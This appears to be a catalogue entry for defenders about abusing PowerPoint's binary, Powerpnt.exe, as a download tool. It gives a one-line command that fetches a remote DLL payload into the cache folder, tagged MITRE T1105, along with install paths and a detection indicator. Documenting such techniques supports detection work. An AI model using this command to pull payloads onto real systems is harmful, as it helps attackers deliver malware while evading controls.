---
Name: Powerpnt.exe
Description: Microsoft Office binary.
Author: 'Reegun J (OCBC Bank)'
Created: 2019-07-19
Commands:
  - Command: Powerpnt.exe "http://192.168.1.10/TeamsAddinLoader.dll"
    Description: Downloads payload from remote server
    Usecase: It will download a remote payload and place it in the cache folder
    Category: Download
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows
Full_Path:
  - Path: C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\Powerpnt.exe
  - Path: C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\Powerpnt.exe
  - Path: C:\Program Files (x86)\Microsoft Office\Office16\Powerpnt.exe
  - Path: C:\Program Files\Microsoft Office\Office16\Powerpnt.exe
  - Path: C:\Program Files (x86)\Microsoft Office 15\ClientX86\Root\Office15\Powerpnt.exe
  - Path: C:\Program Files\Microsoft Office 15\ClientX64\Root\Office15\Powerpnt.exe
  - Path: C:\Program Files (x86)\Microsoft Office\Office15\Powerpnt.exe
  - Path: C:\Program Files\Microsoft Office\Office15\Powerpnt.exe
  - Path: C:\Program Files (x86)\Microsoft Office 14\ClientX86\Root\Office14\Powerpnt.exe
  - Path: C:\Program Files\Microsoft Office 14\ClientX64\Root\Office14\Powerpnt.exe
  - Path: C:\Program Files (x86)\Microsoft Office\Office14\Powerpnt.exe
  - Path: C:\Program Files\Microsoft Office\Office14\Powerpnt.exe
  - Path: C:\Program Files (x86)\Microsoft Office\Office12\Powerpnt.exe
  - Path: C:\Program Files\Microsoft Office\Office12\Powerpnt.exe
  - Path: C:\Program Files\Microsoft Office\Office12\Powerpnt.exe
Detection:
  - IOC: Suspicious Office application Internet/network traffic
Resources:
  - Link: https://twitter.com/reegun21/status/1150032506504151040
  - Link: https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191
Acknowledgement:
  - Person: Reegun J (OCBC Bank)
    Handle: '@reegun21'
---
